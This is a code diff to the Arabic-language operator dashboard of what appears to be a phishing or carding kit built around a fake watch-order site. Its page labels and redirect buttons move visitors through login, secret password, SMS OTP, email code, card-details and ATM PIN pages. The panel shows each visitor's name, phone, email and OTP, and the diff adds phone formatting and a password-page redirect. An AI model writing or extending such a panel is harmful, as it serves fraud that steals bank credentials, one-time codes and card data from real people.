@@ -121,7 +121,7 @@ html,body{height:100%;overflow:hidden;font-family:'Cairo','Segoe UI',sans-serif;
 .codes-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
 .code-card{background:rgba(0,0,0,.3);border-radius:10px;padding:12px;border:1px solid rgba(245,158,11,.2);text-align:center}
 .code-card .lbl{font-size:10px;color:rgba(255,255,255,.5);margin-bottom:4px}
-.code-card .val{font-weight:800;font-size:18px;color:#fbbf24;letter-spacing:2px;font-family:monospace;word-break:break-all}
+.code-card .val{font-weight:800;font-size:18px;color:#fbbf24;letter-spacing:2px;font-family:monospace;word-break:break-all;direction:ltr;unicode-bidi:embed}
 .code-card .cp{margin-top:6px;background:rgba(255,255,255,.08);border:none;border-radius:6px;padding:3px 8px;
   color:#fff;font-size:10px;cursor:pointer;font-family:'Cairo',sans-serif}
 .code-card .cp.ok{color:#4ade80}
@@ -313,8 +313,8 @@ var watches = [
 
 var pageLabels = {
   "index":"الرئيسية","colors":"الألوان","order":"صفحة الطلب",
-  "login":"تسجيل الدخول","password":"الرمز السري",
-  "waiting":"جاري التحقق","code":"رمز التحقق","code3":"رمز 4 أرقام","code-waiting":"تحقق الرمز","code3-waiting":"تحقق رمز 4 أرقام",
+  "login":"تسجيل الدخول","password":"الرمز السري","password-waiting":"تحقق الرمز السري",
+  "waiting":"جاري التحقق","calling":"جاري الاتصال","code":"رمز التحقق","code3":"رمز 4 أرقام","code-waiting":"تحقق الرمز","code3-waiting":"تحقق رمز 4 أرقام",
   "email-code":"رمز الإيميل","email-code-waiting":"تحقق رمز الإيميل",
   "card-details":"بيانات البطاقة","card-waiting":"تحقق البطاقة","atm":"ATM PIN","atm-waiting":"تحقق ATM",
   "success":"تم بنجاح","home":"الرئيسية","pending":"في الانتظار"
@@ -425,6 +425,7 @@ function showNotif(m){var el=document.getElementById("notif");el.textContent=m;e
   setTimeout(function(){el.style.display="none";},4000);}
 
 function esc(s){return s?String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'):'';}
+function fmtPhone(v){if(!v)return'—';return '<span dir="ltr" style="unicode-bidi:embed;display:inline-block">'+esc(v)+'</span>';}
 function fmtDate(ts){if(!ts)return'—';try{var d=new Date(ts);
   return d.toLocaleDateString('ar-EG',{year:'numeric',month:'2-digit',day:'2-digit'})+' '+
   d.toLocaleTimeString('ar-EG',{hour:'2-digit',minute:'2-digit',hour12:true});}catch(e){return'—';}}
@@ -478,7 +479,7 @@ function renderActive(){
     var otp=code?'<span class="otp">OTP: '+esc(code)+'</span>':'';
     return '<div class="ac'+(o.id===selId?' sel':'')+'" onclick="selectOrder('+o.id+')">'+
       '<div class="ac-t"><span class="ac-n">'+(esc(o.name)||esc(o.phone)||'—')+'</span>'+badge+'</div>'+
-      '<div class="ac-info">'+(o.phone?'<span>📱 '+esc(o.phone)+'</span>':'')+otp+'</div></div>';
+      '<div class="ac-info">'+(o.phone?'<span>📱 '+fmtPhone(o.phone)+'</span>':'')+otp+'</div></div>';
   }).join('');
 }
 
@@ -494,7 +495,7 @@ function renderOrders(){
     var stepInfo=pageInfo?'<div class="oc-otp">📲 '+esc(pageInfo)+'</div>':'';
     return '<div class="oc'+(o.id===selId?' sel':'')+'" onclick="selectOrder('+o.id+')">'+
       '<div class="oc-t"><div class="oc-nm"><span>'+(esc(o.name)||esc(o.phone)||'—')+'</span></div>'+statusBadge(o)+'</div>'+
-      '<div class="oc-info">📱 '+(esc(o.phone)||'—')+' • 🕐 '+fmtDate(o.created_at)+' • #'+o.id+'</div>'+
+      '<div class="oc-info">📱 '+fmtPhone(o.phone)+' • 🕐 '+fmtDate(o.created_at)+' • #'+o.id+'</div>'+
       stepInfo+
       '<button class="oc-del '+(isDC?'confirm':'normal')+'" onclick="event.stopPropagation();oDel('+o.id+')">'+(isDC?'⚠️ تأكيد':'✕')+'</button></div>';
   }).join('');
@@ -545,7 +546,7 @@ function renderDetail(o){
   var allData=[
     {icon:'🔖',label:'#',value:String(o.id),hl:true},
     {icon:'👤',label:'الاسم',value:o.name},
-    {icon:'📱',label:'الهاتف',value:o.phone},
+    {icon:'📱',label:'الهاتف',value:o.phone,ltr:true},
     {icon:'📧',label:'البريد',value:o.email},
     {icon:'🌍',label:'الدولة',value:o.country?countryDisplay(o.country):'',html:true},
     {icon:'🏙️',label:'المنطقة',value:o.wilaya},
@@ -564,7 +565,7 @@ function renderDetail(o){
   h+='<div class="sec-data"><h3>📋 جميع البيانات</h3><div class="data-grid">';
   allData.forEach(function(d){
     var hlc=d.hl?' hl':'';
-    var val=d.html?d.value:esc(d.value);
+    var val=d.html?d.value:(d.ltr?fmtPhone(d.value):esc(d.value));
     h+='<div class="data-item'+hlc+'"><div class="lbl">'+d.icon+' '+d.label+'</div>'+
       '<div class="val'+hlc+'">'+val+'</div>'+
       (d.html?'':'<button class="cp" data-copy="'+esc(d.value)+'" onclick="doCopy(this)">نسخ</button>')+'</div>';
@@ -597,6 +598,7 @@ function renderDetail(o){
     {l:'🎨 الألوان',pg:'colors.html',c:'#8b5cf6'},
     {l:'📝 الطلب',pg:'order.html',c:'#0ea5e9'},
     {l:'🔐 الدخول',pg:'login.html',c:'#6366f1'},
+    {l:'🔒 الرمز السري',pg:'password.html',c:'#4f46e5'},
     {l:'⏳ الانتظار',pg:'waiting.html',c:'#7c3aed'},
     {l:'📲 الرمز',pg:'code.html',c:'#f59e0b'},
     {l:'🔢 رمز 4',pg:'code3.html',c:'#0891b2'},
